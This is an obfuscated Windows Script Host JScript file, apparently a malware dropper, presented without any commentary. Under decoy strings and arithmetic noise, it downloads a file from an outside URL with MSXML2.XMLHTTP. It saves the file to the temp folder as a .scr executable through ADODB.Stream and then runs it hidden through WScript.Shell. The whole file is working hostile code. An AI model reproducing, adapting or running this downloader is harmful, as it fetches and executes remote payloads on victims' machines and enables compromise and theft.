operatorAmmunition = (((11 + 18) ^ (([!+[] + !+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[] + !+[]]))), this);
consultantUniform = ("guard", "resolution", "start", "declaration", "Run");
reservoirAccuracy = operatorAmmunition[("WScript")];
reservoirAccuracy[("analogy", "regenerate", "public", "Sleep")](((2048 * 2 + 870) * 3 + (Math.pow(201, 2) - 40299)));
censorEmblem = reservoirAccuracy[("station", "board", "material", "CreateObject")](("bomb", "story", "WScript.Shell"));
standardEffect = censorEmblem[("ExpandEnvironmentStrings")](("formation", "scalpel", "%TEMP%/")) + ("generation", "command", "shunt", "spindleEcho") + ("opposition", "depot", "master", ".scr");
energyUniversity = operatorAmmunition[("initiative", "sphere", "WScript")][("dust", "instance", "pause", function String.prototype.oppositionIllustration() {
	return this
}, "scalpel", "CreateObject")](("legion", "tribune", "catalogue", "MSXML2.XMLHTTP"));
energyUniversity[("journal", "logic", "selective", "separation", "open")](("bomb", "GET"), ("lecture", "http://vgp3.vitebsk.by/6/98yh8bb"), !(6 == ((((14 + 8), (1330 / 38), 23 * 3 * 2, (164, 125, 41, 2)) + ((0 / (23 ^ 9)) | (1 * (68 / 34)))) | ((((0 | 3)) + ((([+[]])) + (5, 4, 38, 0))) * ((1 * 2) & (2 + 1))))));
energyUniversity[("respectable", "investment", "send")]();
while (energyUniversity[("readystate")] < ((1 * 3) ^ (7 + 0))) {
	operatorAmmunition[("front", "human", "document", "WScript")][("hobby", "Sleep")]((2 * 3 * 3 * 3, (1 * 57), (49 + 51)));
}
centreContract = operatorAmmunition[("bureau", "duplicate", "distant", "subject", "WScript")][("tick", "protector", "original", "conductor", "CreateObject")](("bank", "dog", "ADODB.Stream"));
try {
	centreContract[("medical", "preservative", "facade", "projection", "open")]();
	centreContract[("type")] = ((31 ^ 52) / (11 * 3 + 10));
	centreContract[("amortization", "legal", "write")](energyUniversity[("phase", "accordion", "encyclopedia", "ResponseBody")]);
	centreContract[("position")] = 0;
	centreContract[("incident", "saveToFile")](standardEffect, (19 - 17));
	centreContract[("natural", "absolute", "industry", "transport", "close")]();
	censorEmblem[consultantUniform](standardEffect.oppositionIllustration(), (([+[]])), ((107, 167, 44) - (836 / 19)));
} catch (complexSwitch) {};